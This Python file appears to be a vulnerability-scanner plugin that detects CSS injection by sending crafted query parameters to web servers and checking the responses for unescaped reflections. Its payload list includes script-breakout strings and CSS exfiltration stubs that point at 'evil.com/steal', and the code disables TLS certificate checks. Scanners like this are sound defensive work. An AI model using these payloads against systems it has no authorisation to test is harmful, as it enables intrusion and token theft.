"""
Plugin 1240: CSS Injection / CSS Exfiltration Detection
=======================================================
Detects CSS injection vulnerabilities where user input is reflected in CSS
context (<style> tags or style attributes).
"""
import asyncio
import ssl

from plugins import NaslPlugin, PluginResult


class CssInjectionDetection(NaslPlugin):
    PLUGIN_ID = 1240
    NAME = 'CSS Injection / CSS Exfiltration Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 6.1
    DESCRIPTION = (
        'Detects CSS injection vulnerabilities where user input is reflected in '
        'CSS context (<style> tags or style attributes). CSS injection can be used '
        'to exfiltrate sensitive data via attribute selectors and background-image '
        'URLs with CSRF tokens, anti-CSRF tokens, or secret values.'
    )
    SOLUTION = (
        'Never reflect user input inside <style> blocks. Use Content-Security-Policy '
        'to restrict style-src. Validate and sanitize input reflected in style '
        'attributes.'
    )
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    CSS_INJECTION_PAYLOADS = [
        '</style><script>alert(1)</script>',
        '}</style><script>alert(1)</script>',
        '}body{background:red}',
        'body{background:url(http://evil.com/',
        'x{background:url(http://evil.com/steal?q=}',
    ]

    INJECTION_PARAMS = ['q', 'search', 'query', 's', 'text', 'input', 'page', 'id', 'color', 'theme', 'css']

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                host_header = 'alieninc.tech' if target in ('127.0.0.1', 'localhost', '::1') else target
                for payload in self.CSS_INJECTION_PAYLOADS:
                    for param in self.INJECTION_PARAMS:
                        try:
                            reader, writer = await asyncio.wait_for(
                                asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5
                            )
                            encoded = payload.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E').replace('"', '%22').replace('{', '%7B').replace('}', '%7D')
                            req = (
                                f'GET /?{param}={encoded} HTTP/1.1\r\n'
                                f'Host: {host_header}\r\n'
                                f'User-Agent: Centra/1.0\r\n'
                                f'Connection: close\r\n\r\n'
                            )
                            writer.write(req.encode())
                            await writer.drain()
                            response = b''
                            try:
                                while True:
                                    chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                    if not chunk:
                                        break
                                    response += chunk
                                    if len(response) > 8192:
                                        break
                            except asyncio.TimeoutError:
                                pass
                            writer.close()
                            await writer.wait_closed()
                            body = response.split(b'\r\n\r\n', 1)
                            if len(body) > 1:
                                text = body[1].decode('utf-8', errors='ignore')
                                if payload.replace('<', '&lt;').replace('>', '&gt;') not in text:
                                    for indicator in ['</style>', '</style>', 'background:red', 'background:url(']:
                                        if indicator in text:
                                            results.append(PluginResult(
                                                vulnerable=True,
                                                target=target,
                                                port=port_to_check,
                                                cvss_score=self.CVSS_SCORE,
                                                severity='medium',
                                                description=(
                                                    f'CSS injection detected via param "{param}" '
                                                    f'- payload reflects unsanitized in style context'
                                                ),
                                                solution=self.SOLUTION,
                                                evidence=f'Payload: {payload}, reflected indicator: {indicator}',
                                                references=[
                                                    'https://portswigger.net/web-security/css-injection',
                                                    'https://owasp.org/www-community/attacks/CSS_Injection',
                                                ]
                                            ))
                                            break
                        except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                            pass
                    if results:
                        break
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass
        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No CSS injection indicators detected'
            ))
        return results
